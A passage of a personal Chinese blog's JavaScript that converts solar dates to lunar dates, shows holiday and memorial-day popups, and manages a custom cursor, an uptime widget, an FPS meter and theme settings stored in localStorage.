'7f0e27f0e47f531b0b0bb0b6fb0722', '7f0e397bd07f595b0b0bc920fb0722',  '977837f0e37f14998082b0723b06bd', '7f07e7f0e37f149b0723b0787b0721', '7f0e27f0e47f531b0723b0b6fb0722',  '7f0e397bd07f595b0b0bc920fb0722', '977837f0e37f14898082b0723b02d5', '7ec967f0e37f14998082b0787b0721',  '7f07e7f0e47f531b0723b0b6fb0722', '7f0e37f1487f595b0b0bb0b6fb0722', '7f0e37f0e37f14898082b0723b02d5',  '7ec967f0e37f14998082b0787b0721', '7f07e7f0e47f531b0723b0b6fb0722', '7f0e37f1487f531b0b0bb0b6fb0722',  '7f0e37f0e37f14898082b0723b02d5', '7ec967f0e37f14998082b0787b06bd', '7f07e7f0e47f531b0723b0b6fb0721',  '7f0e37f1487f531b0b0bb0b6fb0722', '7f0e37f0e37f14898082b072297c35', '7ec967f0e37f14998082b0787b06bd',  '7f07e7f0e47f531b0723b0b6fb0721', '7f0e27f1487f531b0b0bb0b6fb0722', '7f0e37f0e37f14898082b072297c35',  '7ec967f0e37f14998082b0787b06bd', '7f07e7f0e47f531b0723b0b6fb0721', '7f0e27f1487f531b0b0bb0b6fb0722',  '7f0e37f0e366aa89801eb072297c35', '7ec967f0e37f14998082b0787b06bd', '7f07e7f0e47f149b0723b0787b0721',  '7f0e27f1487f531b0b0bb0b6fb0722', '7f0e37f0e366aa89801eb072297c35', '7ec967f0e37f14998082b0723b06bd',  '7f07e7f0e47f149b0723b0787b0721', '7f0e27f0e47f531b0723b0b6fb0722', '7f0e37f0e366aa89801eb072297c35',  '7ec967f0e37f14998082b0723b06bd', '7f07e7f0e37f14998083b0787b0721', '7f0e27f0e47f531b0723b0b6fb0722',  '7f0e37f0e366aa89801eb072297c35', '7ec967f0e37f14898082b0723b02d5', '7f07e7f0e37f14998082b0787b0721',  '7f07e7f0e47f531b0723b0b6fb0722', '7f0e36665b66aa89801e9808297c35', '665f67f0e37f14898082b0723b02d5',  '7ec967f0e37f14998082b0787b0721', '7f07e7f0e47f531b0723b0b6fb0722', '7f0e36665b66a449801e9808297c35',  '665f67f0e37f14898082b0723b02d5', '7ec967f0e37f14998082b0787b06bd', '7f07e7f0e47f531b0723b0b6fb0721',  '7f0e36665b66a449801e9808297c35', '665f67f0e37f14898082b072297c35', '7ec967f0e37f14998082b0787b06bd',  '7f07e7f0e47f531b0723b0b6fb0721', '7f0e26665b66a449801e9808297c35', '665f67f0e37f1489801eb072297c35',  '7ec967f0e37f14998082b0787b06bd', '7f07e7f0e47f531b0723b0b6fb0721', '7f0e27f1487f531b0b0bb0b6fb0722']/** * 数字转中文速查表* @Array Of Property* @trans ['日','一','二','三','四','五','六','七','八','九','十']* @return Cn string */var nStr1 = ['\u65e5', '\u4e00', '\u4e8c', '\u4e09', '\u56db', '\u4e94', '\u516d', '\u4e03', '\u516b', '\u4e5d', '\u5341']/*** 日期转农历称呼速查表* @Array Of Property* @trans ['初','十','廿','卅']* @return Cn string*/var nStr2 = ['\u521d', '\u5341', '\u5eff', '\u5345']/*** 月份转农历称呼速查表* @Array Of Property* @trans ['正','一','二','三','四','五','六','七','八','九','十','冬','腊']* @return Cn string*/var nStr3 = ['\u6b63', '\u4e8c', '\u4e09', '\u56db', '\u4e94', '\u516d', '\u4e03', '\u516b', '\u4e5d', '\u5341', '\u51ac', '\u814a']/*** 返回农历y年一整年的总天数* @param lunar Year * @return Number* @eg:var count = calendar.lYearDays(1987) ;//count=387*/function lYearDays(y) {  var i  var sum = 348  for (i = 0x8000; i > 0x8; i >>= 1) { sum += (lunarInfo[y - 1900] & i) ? 1 : 0 }  return (sum + leapDays(y))}/*** 返回农历y年闰月是哪个月；若y年没有闰月 则返回0* @param lunar Year* @return Number (0-12) * @eg:var leapMonth = calendar.leapMonth(1987) ;//leapMonth=6*/function leapMonth(y) { // 闰字编码 \u95f0  return (lunarInfo[y - 1900] & 0xf)}/*** 返回农历y年闰月的天数 若该年没有闰月则返回0* @param lunar Year* @return Number (0、29、30)* @eg:var leapMonthDay = calendar.leapDays(1987) ;//leapMonthDay=29*/function leapDays(y) {  if (leapMonth(y)) {    return ((lunarInfo[y - 1900] & 0x10000) ? 30 : 29)  }  return (0)}/*** 返回农历y年m月（非闰月）的总天数，计算m为闰月时的天数请使用leapDays方法* @param lunar Year* @return Number (-1、29、30) * @eg:var MonthDay = calendar.monthDays(1987,9) ;//MonthDay=29*/function monthDays(y, m) {  if (m > 12 || m < 1) { return -1 }  return ((lunarInfo[y - 1900] & (0x10000 >> m)) ? 30 : 29)}/*** 返回公历(!)y年m月的天数* @param solar Year* @return Number (-1、28、29、30、31)* @eg:var solarMonthDay = calendar.leapDays(1987) ;//solarMonthDay=30*/function solarDays(y, m) {  if (m > 12 || m < 1) { return -1 }  var ms = m - 1  if (ms === 1) {     return (((y % 4 === 0) && (y % 100 !== 0) || (y % 400 === 0)) ? 29 : 28)  } else {    return (solarMonth[ms])  }}/*** 农历年份转换为干支纪年* @param  lYear 农历年的年份数* @return Cn string*/function toGanZhiYear(lYear) {  var ganKey = (lYear - 3) % 10  var zhiKey = (lYear - 3) % 12  if (ganKey === 0) ganKey = 10   if (zhiKey === 0) zhiKey = 12  return Gan[ganKey - 1] + Zhi[zhiKey - 1]}/*** 公历月、日判断所属星座* @param  cMonth [description]* @param  cDay [description]* @return Cn string*/function toAstro(cMonth, cDay) {  var s = '\u9b54\u7faf\u6c34\u74f6\u53cc\u9c7c\u767d\u7f8a\u91d1\u725b\u53cc\u5b50\u5de8\u87f9\u72ee\u5b50\u5904\u5973\u5929\u79e4\u5929\u874e\u5c04\u624b\u9b54\u7faf'  var arr = [20, 19, 21, 21, 21, 22, 23, 23, 23, 23, 22, 22]  return s.substr(cMonth * 2 - (cDay < arr[cMonth - 1] ? 2 : 0), 2) + '\u5ea7' // 座}/*** 传入offset偏移量返回干支* @param offset 相对甲子的偏移量* @return Cn string*/function toGanZhi(offset) {  return Gan[offset % 10] + Zhi[offset % 12]}/*** 传入公历(!)y年获得该年第n个节气的公历日期* @param y公历年(1900-2100)；n二十四节气中的第几个节气(1~24)；从n=1(小寒)算起* @return day Number* @eg:var _24 = calendar.getTerm(1987,3) ;//_24=4;意即1987年2月4日立春*/function getTerm(y, n) {  if (y < 1900 || y > 2100) { return -1 }  if (n < 1 || n > 24) { return -1 }  var _table = sTermInfo[y - 1900]  var _info = [    parseInt('0x' + _table.substr(0, 5)).toString(),    parseInt('0x' + _table.substr(5, 5)).toString(),    parseInt('0x' + _table.substr(10, 5)).toString(),    parseInt('0x' + _table.substr(15, 5)).toString(),    parseInt('0x' + _table.substr(20, 5)).toString(),    parseInt('0x' + _table.substr(25, 5)).toString()  ]  var _calday = [    _info[0].substr(0, 1),    _info[0].substr(1, 2),    _info[0].substr(3, 1),    _info[0].substr(4, 2),    _info[1].substr(0, 1),    _info[1].substr(1, 2),    _info[1].substr(3, 1),    _info[1].substr(4, 2),    _info[2].substr(0, 1),    _info[2].substr(1, 2),    _info[2].substr(3, 1),    _info[2].substr(4, 2),    _info[3].substr(0, 1),    _info[3].substr(1, 2),    _info[3].substr(3, 1),    _info[3].substr(4, 2),    _info[4].substr(0, 1),    _info[4].substr(1, 2),    _info[4].substr(3, 1),    _info[4].substr(4, 2),    _info[5].substr(0, 1),    _info[5].substr(1, 2),    _info[5].substr(3, 1),    _info[5].substr(4, 2)  ]  return parseInt(_calday[n - 1])}/*** 传入农历数字月份返回汉语通俗表示法* @param lunar month* @return Cn string* @eg:var cnMonth = calendar.toChinaMonth(12) ;//cnMonth='腊月'*/function toChinaMonth(m) { // 月 => \u6708  if (m > 12 || m < 1) { return -1 }   var s = nStr3[m - 1]  s += '\u6708'   return s}/*** 传入农历日期数字返回汉字表示法* @param lunar day* @return Cn string* @eg:var cnDay = calendar.toChinaDay(21) ;//cnMonth='廿一'*/function toChinaDay(d) { // 日 => \u65e5  var s  switch (d) {    case 10:      s = '\u521d\u5341'      break    case 20:      s = '\u4e8c\u5341'      break    case 30:      s = '\u4e09\u5341'      break    default:      s = nStr2[Math.floor(d / 10)]      s += nStr1[d % 10]  }  return (s)}/*** 年份转生肖[!仅能大致转换] => 精确划分生肖分界线是“立春”* @param y year* @return Cn string* @eg:var animal = calendar.getAnimal(1987) ;//animal='兔'*/function getAnimal(y) {  return Animals[(y - 4) % 12]}/*** 传入阳历年月日获得详细的公历、农历object信息 <=>JSON* @param y  solar year* @param m  solar month* @param d  solar day* @return JSON object* @eg:console.log(calendar.solar2lunar(1987,11,01));*/function solar2lunar(y, m, d) {   if (y < 1900 || y > 2100) {    return -1  }  if (y === 1900 && m === 1 && d < 31) {    return -1  }  var objDate = null  if (!y) {    objDate = new Date()  } else {    objDate = new Date(y, parseInt(m) - 1, d)  }  var i  var leap = 0  var temp = 0  y = objDate.getFullYear()  m = objDate.getMonth() + 1  d = objDate.getDate()  var offset = (Date.UTC(objDate.getFullYear(), objDate.getMonth(), objDate.getDate()) - Date.UTC(1900, 0, 31)) / 86400000  for (i = 1900; i < 2101 && offset > 0; i++) {    temp = lYearDays(i)    offset -= temp  }  if (offset < 0) {    offset += temp; i--  }  var isTodayObj = new Date()  var isToday = false  if (isTodayObj.getFullYear() === y && isTodayObj.getMonth() + 1 === m && isTodayObj.getDate() === d) {    isToday = true  }  var nWeek = objDate.getDay()  var cWeek = nStr1[nWeek]  if (nWeek === 0) {    nWeek = 7  }  var year = i  leap = leapMonth(i)  var isLeap = false  for (i = 1; i < 13 && offset > 0; i++) {    if (leap > 0 && i === (leap + 1) && isLeap === false) {      --i      isLeap = true; temp = leapDays(year)    } else {      temp = monthDays(year, i)    }    if (isLeap === true && i === (leap + 1)) { isLeap = false }    offset -= temp  }  if (offset === 0 && leap > 0 && i === leap + 1) {    if (isLeap) {      isLeap = false    } else {      isLeap = true; --i    }  }  if (offset < 0) {    offset += temp; --i  }  var month = i  var day = offset + 1  var sm = m - 1  var gzY = toGanZhiYear(year)  var firstNode = getTerm(y, (m * 2 - 1))  var secondNode = getTerm(y, (m * 2))  var gzM = toGanZhi((y - 1900) * 12 + m + 11)  if (d >= firstNode) {    gzM = toGanZhi((y - 1900) * 12 + m + 12)  }  var isTerm = false  var Term = null  if (firstNode === d) {    isTerm = true    Term = solarTerm[m * 2 - 2]  }  if (secondNode === d) {    isTerm = true    Term = solarTerm[m * 2 - 1]  }  var dayCyclical = Date.UTC(y, sm, 1, 0, 0, 0, 0) / 86400000 + 25567 + 10  var gzD = toGanZhi(dayCyclical + d - 1)  var astro = toAstro(m, d)  return { 'lYear': year, 'lMonth': month, 'lDay': day, 'Animal': getAnimal(year), 'IMonthCn': (isLeap ? '\u95f0' : '') + toChinaMonth(month), 'IDayCn': toChinaDay(day), 'cYear': y, 'cMonth': m, 'cDay': d, 'gzYear': gzY, 'gzMonth': gzM, 'gzDay': gzD, 'isToday': isToday, 'isLeap': isLeap, 'nWeek': nWeek, 'ncWeek': '\u661f\u671f' + cWeek, 'isTerm': isTerm, 'Term': Term, 'astro': astro }}var calendarFormatter = {  solar2lunar: function (y, m, d) {     return solar2lunar(y, m, d)  },  /**  * 传入农历年月日以及传入的月份是否闰月获得详细的公历、农历object信息 <=>JSON  * @param y  lunar year  * @param m  lunar month  * @param d  lunar day  * @param isLeapMonth  lunar month is leap or not.[如果是农历闰月第四个参数赋值true即可]  * @return JSON object  * @eg:console.log(calendar.lunar2solar(1987,9,10));  */  lunar2solar: function (y, m, d, isLeapMonth) {    isLeapMonth = !!isLeapMonth    if (isLeapMonth && (leapMonth !== m)) { return -1 }    if (y === 2100 && m === 12 && d > 1 || y === 1900 && m === 1 && d < 31) { return -1 }     var day = monthDays(y, m)    var _day = day    if (isLeapMonth) {      _day = leapDays(y, m)    }    if (y < 1900 || y > 2100 || d > _day) { return -1 }    var offset = 0    for (var i = 1900; i < y; i++) {      offset += lYearDays(i)    }    var leap = 0    var isAdd = false    for (i = 1; i < m; i++) {      leap = leapMonth(y)      if (!isAdd) {        if (leap <= i && leap > 0) {          offset += leapDays(y); isAdd = true        }      }      offset += monthDays(y, i)    }    if (isLeapMonth) { offset += day }    var stmap = Date.UTC(1900, 1, 30, 0, 0, 0)    var calObj = new Date((offset + d - 31) * 86400000 + stmap)    var cY = calObj.getUTCFullYear()    var cM = calObj.getUTCMonth() + 1    var cD = calObj.getUTCDate()    return solar2lunar(cY, cM, cD)  }}var d = new Date();m = d.getMonth() + 1;dd = d.getDate();y = d.getFullYear();if (m == 9 && dd == 18) {  document.getElementsByTagName("html")[0].setAttribute("style", "filter: grayscale(60%);");  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("今天是九一八事变" + (y - 1931).toString() + "周年纪念日\n🪔勿忘国耻，振兴中华🪔");    sessionStorage.setItem("isPopupWindow", "1");  }}if (m == 7 && dd == 7) {  document.getElementsByTagName("html")[0].setAttribute("style", "filter: grayscale(60%);");  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("今天是卢沟桥事变" + (y - 1937).toString() + "周年纪念日\n🪔勿忘国耻，振兴中华🪔");    sessionStorage.setItem("isPopupWindow", "1");  }}if (m == 12 && dd == 13) {  document.getElementsByTagName("html")[0].setAttribute("style", "filter: grayscale(60%);");  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("今天是南京大屠杀" + (y - 1937).toString() + "周年纪念日\n🪔勿忘国耻，振兴中华🪔");    sessionStorage.setItem("isPopupWindow", "1");  }}if (m == 8 && dd == 14) {  document.getElementsByTagName("html")[0].setAttribute("style", "filter: grayscale(60%);");  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("今天是世界慰安妇纪念日\n🪔勿忘国耻，振兴中华🪔");    sessionStorage.setItem("isPopupWindow", "1");  }}if (m == 10 && dd <= 3) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("祝祖国" + (y - 1949).toString() + "岁生日快乐！");    sessionStorage.setItem("isPopupWindow", "1");  }}if (m == 8 && dd == 15) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("小日子已经投降" + (y - 1945).toString() + "年了😃");    sessionStorage.setItem("isPopupWindow", "1");  }}if (m == 1 && dd == 1) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire(y.toString() + "年元旦快乐！🎉");    sessionStorage.setItem("isPopupWindow", "1");  }}if (m == 3 && dd == 8) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("各位女神们，妇女节快乐！👩");    sessionStorage.setItem("isPopupWindow", "1");  }}l = ["非常抱歉，因为不可控原因，博客将于明天停止运营！", "好消息，日本没了！", "美国垮了，原因竟然是川普！", "微软垮了！", "你的电脑已经过载，建议立即关机！", "你知道吗？站长很喜欢你哦！", "一分钟有61秒哦", "你喜欢的人跟别人跑了！"]if (m == 4 && dd == 1) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire(l[Math.floor(Math.random() * l.length)]);    sessionStorage.setItem("isPopupWindow", "1");  }}if (m == 5 && dd == 1) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("劳动节快乐\n为各行各业辛勤工作的人们致敬！");    sessionStorage.setItem("isPopupWindow", "1");  }}if (m == 5 && dd == 4) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("青年节快乐\n青春不是回忆逝去,而是把握现在！");    sessionStorage.setItem("isPopupWindow", "1");  }}if (m == 5 && dd == 20) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("今年是520情人节\n快和你喜欢的人一起过吧！💑");    sessionStorage.setItem("isPopupWindow", "1");  }}if (m == 7 && dd == 1) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("祝中国共产党" + (y - 1921).toString() + "岁生日快乐！");    sessionStorage.setItem("isPopupWindow", "1");  }}if (m == 9 && dd == 10) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("各位老师们教师节快乐！👩‍🏫");    sessionStorage.setItem("isPopupWindow", "1");  }}if (m == 12 && dd == 25) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("圣诞节快乐！🎄");    sessionStorage.setItem("isPopupWindow", "1");  }}if (m == 6 && dd == 30) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("祝小猫咪" + (y - 1999).toString() + "岁生日快乐！🐱");    sessionStorage.setItem("isPopupWindow", "1");  }}if ((y == 2023 && m == 4 && dd == 5) || (y == 2024 && m == 4 && dd == 4) || (y == 2025 && m == 4 && dd == 4)) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("清明时节雨纷纷,一束鲜花祭故人💐");    sessionStorage.setItem("isPopupWindow", "1");  }}if ((y == 2023 && m == 12 && dd == 22) || (y == 2024 && m == 12 && dd == 21) || (y == 2025 && m == 12 && dd == 21)) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("冬至快乐\n快吃上一碗热热的汤圆和饺子吧🧆");    sessionStorage.setItem("isPopupWindow", "1");  }}var lunar = calendarFormatter.solar2lunar();if (lunar["IMonthCn"] == "七月" && lunar["IDayCn"] == "廿七") {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("祝站长" + (y - 2005).toString() + "岁生日快乐！🥝");    sessionStorage.setItem("isPopupWindow", "1");  }}if ((lunar["IMonthCn"] == "正月" && lunar["IDayCn"] == "初六") || (lunar["IMonthCn"] == "正月" && lunar["IDayCn"] == "初五") || (lunar["IMonthCn"] == "正月" && lunar["IDayCn"] == "初四") || (lunar["IMonthCn"] == "正月" && lunar["IDayCn"] == "初三") || (lunar["IMonthCn"] == "正月" && lunar["IDayCn"] == "初二") || (lunar["IMonthCn"] == "正月" && lunar["IDayCn"] == "初一") || (lunar["IMonthCn"] == "腊月" && lunar["IDayCn"] == "三十") || (lunar["IMonthCn"] == "腊月" && lunar["IDayCn"] == "廿九")) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire(y.toString() + "年新年快乐\n🎊祝你心想事成，诸事顺利🎊");    sessionStorage.setItem("isPopupWindow", "1");  }}if ((lunar["IMonthCn"] == "正月" && lunar["IDayCn"] == "十五")) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("元宵节快乐\n送你一个大大的灯笼🧅");    sessionStorage.setItem("isPopupWindow", "1");  }}if ((lunar["IMonthCn"] == "五月" && lunar["IDayCn"] == "初五")) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("端午节快乐\n请你吃一条粽子🍙");    sessionStorage.setItem("isPopupWindow", "1");  }}if ((lunar["IMonthCn"] == "七月" && lunar["IDayCn"] == "初七")) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("七夕节快乐\n黄昏后,柳梢头,牛郎织女来碰头");    sessionStorage.setItem("isPopupWindow", "1");  }}if ((lunar["IMonthCn"] == "八月" && lunar["IDayCn"] == "十五")) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("中秋节快乐\n请你吃一块月饼🍪");    sessionStorage.setItem("isPopupWindow", "1");  }}if ((lunar["IMonthCn"] == "九月" && lunar["IDayCn"] == "初九")) {  if (sessionStorage.getItem("isPopupWindow") != "1") {    Swal.fire("重阳节快乐\n独在异乡为异客，每逢佳节倍思亲");    sessionStorage.setItem("isPopupWindow", "1");  }}// if (y == 2022 && m == 12 && (dd >= 18 && dd <= 20)) {//     if (sessionStorage.getItem("isPopupWindow") != "1") {//         Swal.fire("网站换成冬日限定主题啦⛄");//         sessionStorage.setItem("isPopupWindow", "1");//     }// }var CURSOR;Math.lerp = (a, b, n) => (1 - n) * a + n * b;const getStyle2 = (el, attr) => {  try {    return window.getComputedStyle      ? window.getComputedStyle(el)[attr]      : el.currentStyle[attr];  } catch (e) { }  return "";};const map = new Map();map.set('red', "rgb(241, 71, 71)");map.set('orange', "rgb(241, 162, 71)");map.set('yellow', "rgb(241, 238, 71)")map.set('purple', "rgb(179, 71, 241)");map.set('blue', "rgb(102, 204, 255)");map.set('gray', "rgb(226, 226, 226)");map.set('green', "rgb(57, 197, 187)");map.set('whitegray', "rgb(241, 241, 241)");map.set('pink', "rgb(237, 112, 155)");map.set('black', "rgb(0, 0, 0)");map.set('darkblue', "rgb(97, 100, 159)");map.set('heoblue', "rgb(66, 90, 239)");class Cursor {  constructor() {    this.pos = { curr: null, prev: null };    this.pt = [];    this.create();    this.init();    this.render();  }  move(left, top) {    this.cursor.style["left"] = `${left}px`;    this.cursor.style["top"] = `${top}px`;  }  create() {    if (!this.cursor) {      this.cursor = document.createElement("div");      this.cursor.id = "cursor";      this.cursor.classList.add("hidden");      document.body.append(this.cursor);    }    var el = document.getElementsByTagName('*');    for (let i = 0; i < el.length; i++)      if (getStyle2(el[i], "cursor") == "pointer")        this.pt.push(el[i].outerHTML);    var colorVal = map.get(localStorage.getItem("themeColor"));    document.body.appendChild((this.scr = document.createElement("style")));    this.scr.innerHTML = `* {cursor: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8' width='8px' height='8px'><circle cx='4' cy='4' r='4' opacity='1.0' fill='` + colorVal + `'/></svg>") 4 4, auto}`;  }  refresh() {    this.scr.remove();    this.cursor.classList.remove("hover");    this.cursor.classList.remove("active");    this.pos = { curr: null, prev: null };    this.pt = [];    this.create();    this.init();    this.render();  }  init() {    document.onmouseover = e => this.pt.includes(e.target.outerHTML) && this.cursor.classList.add("hover");    document.onmouseout = e => this.pt.includes(e.target.outerHTML) && this.cursor.classList.remove("hover");    document.onmousemove = e => { (this.pos.curr == null) && this.move(e.clientX - 8, e.clientY - 8); this.pos.curr = { x: e.clientX - 8, y: e.clientY - 8 }; this.cursor.classList.remove("hidden"); };    document.onmouseenter = e => this.cursor.classList.remove("hidden");    document.onmouseleave = e => this.cursor.classList.add("hidden");    document.onmousedown = e => this.cursor.classList.add("active");    document.onmouseup = e => this.cursor.classList.remove("active");  }  render() {    if (this.pos.prev) {      this.pos.prev.x = Math.lerp(this.pos.prev.x, this.pos.curr.x, 0.15);      this.pos.prev.y = Math.lerp(this.pos.prev.y, this.pos.curr.y, 0.15);      this.move(this.pos.prev.x, this.pos.prev.y);    } else {      this.pos.prev = this.pos.curr;    }    requestAnimationFrame(() => this.render());  }}(() => {  CURSOR = new Cursor();})();var now = new Date();function createtime() {  now.setTime(now.getTime() + 1000);  var start = new Date("08/01/2022 00:00:00");   var dis = Math.trunc(23400000000 + ((now - start) / 1000) * 17);  var unit = (dis / 149600000).toFixed(6);   var grt = new Date("11/29/2024 00:00:00");  var days = (now - grt) / 1e3 / 60 / 60 / 24,    dnum = Math.floor(days),    hours = (now - grt) / 1e3 / 60 / 60 - 24 * dnum,    hnum = Math.floor(hours);  1 == String(hnum).length && (hnum = "0" + hnum);  var minutes = (now - grt) / 1e3 / 60 - 1440 * dnum - 60 * hnum,    mnum = Math.floor(minutes);  1 == String(mnum).length && (mnum = "0" + mnum);  var seconds = (now - grt) / 1e3 - 86400 * dnum - 3600 * hnum - 60 * mnum,    snum = Math.round(seconds);  1 == String(snum).length && (snum = "0" + snum);  let currentTimeHtml = "";  currentTimeHtml =    hnum < 21 && hnum >= 8      ? `<img class='boardsign' src='/assets/糖果屋-营业中.svg' title='距离百年老店也就差不到一百年~'><br> <div style="font-size:13px;font-weight:bold">本站居然运行了 ${dnum} 天 ${hnum} 小时 ${mnum} 分 ${snum} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> <b>旅行者 1 号当前距离地球 ${dis} 千米，约为 ${unit} 个天文单位 🚀</b> <br> <b><font size=2px>少年有他的山海，有他的重重山影，有他的万里波涛。如果可以，风给他，沙漠给他，天空也给他。是无拘无束的风，会下大雨的沙漠，和铺满星辰的天空。万物给他，让他自由✨</font></b></div>`      : `<img class='boardsign' src='/assets/糖果屋-打烊了.svg' title='这个点了应该去睡觉啦，熬夜对身体不好哦'><br> <div style="font-size:13px;font-weight:bold">本站居然运行了 ${dnum} 天 ${hnum} 小时 ${mnum} 分 ${snum} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${dis} 千米，约为 ${unit} 个天文单位 🚀</b> <br> <b><font size=2px>少年有他的山海，有他的重重山影，有他的万里波涛。如果可以，风给他，沙漠给他，天空也给他。是无拘无束的风，会下大雨的沙漠，和铺满星辰的天空。万物给他，让他自由✨</font></b></div>`,  document.getElementById("workboard")  document.getElementById("workboard").innerHTML = currentTimeHtml}setInterval(() => {  createtime();}, 1000);if (window.localStorage.getItem("fpson") == undefined || window.localStorage.getItem("fpson") == "1") {  var rAF = function () {    return (      window.requestAnimationFrame ||      window.webkitRequestAnimationFrame ||      function (callback) {        window.setTimeout(callback, 1000 / 60);      }    );  }();  var frame = 0;  var allFrameCount = 0;  var lastTime = Date.now();  var lastFameTime = Date.now();  var loop = function () {    var now = Date.now();    var fs = (now - lastFameTime);    var fps = Math.round(1000 / fs);    lastFameTime = now;    allFrameCount++;    frame++;    if (now > 1000 + lastTime) {      var fps = Math.round((frame * 1000) / (now - lastTime));      if (fps <= 5) {        var kd = `<span style="color:#bd0000">卡成ppt🤢</span>`      } else if (fps <= 15) {        var kd = `<span style="color:red">电竞级帧率😖</span>`      } else if (fps <= 25) {        var kd = `<span style="color:orange">有点难受😨</span>`      } else if (fps < 35) {        var kd = `<span style="color:#9338e6">不太流畅🙄</span>`      } else if (fps <= 45) {        var kd = `<span style="color:#08b7e4">还不错哦😁</span>`      } else {        var kd = `<span style="color:#39c5bb">十分流畅🤣</span>`      }      document.getElementById("fps").innerHTML = `FPS:${fps} ${kd}`;      frame = 0;      lastTime = now;    };    rAF(loop);  }  loop();} else {  document.getElementById("fps").style = "display:none!important"}if (localStorage.getItem("reset_4") == undefined) {  localStorage.setItem("reset_4", "1");  for (var i = 1; i <= 3; i++) {    localStorage.removeItem("reset_" + i);  }  clearItem();  setTimeout(function () {    new Vue({      data: function () {        this.$notify({          title: "提示🍒",          message: " (｡･∀･)ﾉﾞ由于网站部分设置项更新，当前已为您重置所有设置，祝您愉快！",          position: 'top-left',          offset: 50,          showClose: true,          type: "success",          duration: 8000        });      }    })  }, 1500);}function clearItem() {  localStorage.removeItem('blogbg')  localStorage.removeItem('universe')  localStorage.removeItem('blur')  localStorage.removeItem('fpson')  localStorage.removeItem('transNum')  localStorage.removeItem('blurRad')  localStorage.removeItem('font')  localStorage.removeItem('themeColor')  localStorage.removeItem('rs')  localStorage.removeItem('mouse')  localStorage.removeItem('light')  localStorage.removeItem('snow')}if (localStorage.getItem("font") == undefined) {  localStorage.setItem("font", "LXGW");}setFont(localStorage.getItem("font"));function setFont(n) {  localStorage.setItem("font", n)  if (n == "default") {    document.documentElement.style.setProperty('--global-font', '-apple-system');    document.body.style.fontFamily = "-apple-system, Consolas_1, BlinkMacSystemFont, 'Segoe UI' , 'Helvetica Neue' , Lato, Roboto, 'PingFang SC' , 'Microsoft JhengHei' , 'Microsoft YaHei' , sans-serif";  }  else {    document.documentElement.style.setProperty('--global-font', n);    document.body.style.fontFamily = "var(--global-font),-apple-system, IBM Plex Mono ,monosapce,'微软雅黑', sans-serif";  }  try { setFontBorder(); } catch (err) { };}function setFontBorder() {  var curFont = localStorage.getItem("font");  var swfId = "swf_" + curFont;  document.getElementById(swfId).style.border = "2px solid var(--theme-color)";  Array.prototype.forEach.call(document.getElementsByClassName("swf"), function (ee) {    if (ee.id != swfId) ee.style.border = "2px solid var(--border-color)";  });}if (localStorage.getItem("themeColor") == undefined) {  localStorage.setItem("themeColor", "green");}setColor(localStorage.getItem("themeColor"));function setColor(c) {  document.getElementById("themeColor").innerText = `:root{--theme-color:` + map.get(c) + ` !important}`;  localStorage.setItem("themeColor", c);  CURSOR.refresh();  var theme_color = map.get(c);  var trans_theme_color = "rgba" + theme_color.substring(3, theme_color.length - 1) + ", 0.7)";  var high_trans_color = "rgba" + theme_color.substring(3, theme_color.length - 1) + ", 0.5)";  document.documentElement.style.setProperty("--text-bg-hover", trans_theme_color);  document.documentElement.style.setProperty("--high-trans-color", high_trans_color);}if (localStorage.getItem("universe") == undefined) {  localStorage.setItem("universe", "block");}setUniverse2(localStorage.getItem("universe"));function setUniverse2(c) {  document.getElementById("universe").style.display = c;  localStorage.setItem("universe", c);}function setUniverse() {  if (document.getElementById("universeSet").checked) {    setUniverse2("block");  } else {    setUniverse2("none");  }}if (localStorage.getItem("snow") == undefined) {  localStorage.setItem("snow", "block");}document.getElementById("snow").style.display = localStorage.getItem("snow");function setSnow() {  if (document.getElementById("snowSet").checked) {    document.getElementById("snow").style.display = "block";    localStorage.setItem("snow", "block");  } else {    document.getElementById("snow").style.display = "none";    localStorage.setItem("snow", "none");  }}if (localStorage.getItem("fpson") == undefined) {  localStorage.setItem("fpson", "1");}function fpssw() {  if (document.getElementById("fpson").checked) {    localStorage.setItem("fpson", "1");  } else {    localStorage.setItem("fpson", "0");  }  setTimeout(reload, 600);}function reload() {  window.location.reload();}if (localStorage.getItem("rs") == undefined) {  localStorage.setItem("rs", "block");}if (localStorage.getItem("rs") == "block") {  document.getElementById("rightSide").innerText = `:root{--rightside-display: block}`;} else {  document.getElementById("rightSide").innerText = `:root{--rightside-display: none}`;}function toggleRightside() {  if (document.getElementById("rightSideSet").checked) {    localStorage.setItem("rs", "block");    document.getElementById("rightSide").innerText = `:root{--rightside-display: block}`;  } else {    localStorage.setItem("rs", "none");    document.getElementById("rightSide").innerText = `:root{--rightside-display: none}`;  }}if (localStorage.getItem("transNum") == undefined) {  localStorage.setItem("transNum", 50);}var curTransNum = localStorage.getItem("transNum");var curTransMini = curTransNum * 0.95;document.getElementById("transPercent").innerText = `:root{--trans-light: rgba(253, 253, 253, ${curTransNum}%) !important; 